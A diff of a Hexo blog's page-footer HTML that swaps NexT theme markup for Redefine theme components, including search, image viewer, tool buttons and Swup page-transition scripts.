-                  常见文件文件头和隐写术总结 CTF中Misc必备 <i class="fa fa-angle-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+		<li class="right-bottom-tools rss flex justify-center items-center">
+			<a class="flex justify-center items-center" href="/atom.xml" target="_blank">
+				<i class="fa-regular fa-rss"></i>
+			</a>
+		</li>
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
 </div>
 
 
-
-
-
-
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
 </div>
-  </main>
+	
 
-  <footer class="footer">
-    <div class="footer-inner">
+</main>
 
-  <div class="copyright">
-    &copy; 2023 – 
-    <span itemprop="copyrightYear">2026</span>
-    <span class="with-love">
-      <i class="fa fa-heart"></i>
-    </span>
-    <span class="author" itemprop="copyrightHolder">true</span>
-  </div>
-<div class="wordcount">
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-line"></i>
-    </span>
-      <span>站点总字数：</span>
-    <span title="站点总字数">349k</span>
-  </span>
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">21:11</span>
-  </span>
-</div>
-  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
-  </div>
 
-    </div>
-  </footer>
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
 
   
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-  <div class="sidebar-dimmer"></div>
-  <div class="back-to-top" role="button" aria-label="返回顶部">
-    <i class="fa fa-arrow-up fa-lg"></i>
-    <span>0%</span>
-  </div>
+<script src="/js/build/libs/Typed.min.js"></script>
 
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
 
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+    
+<script src="/js/build/libs/pangu.min.js"></script>
+
+
+
+	
 </body>
+
 </html>
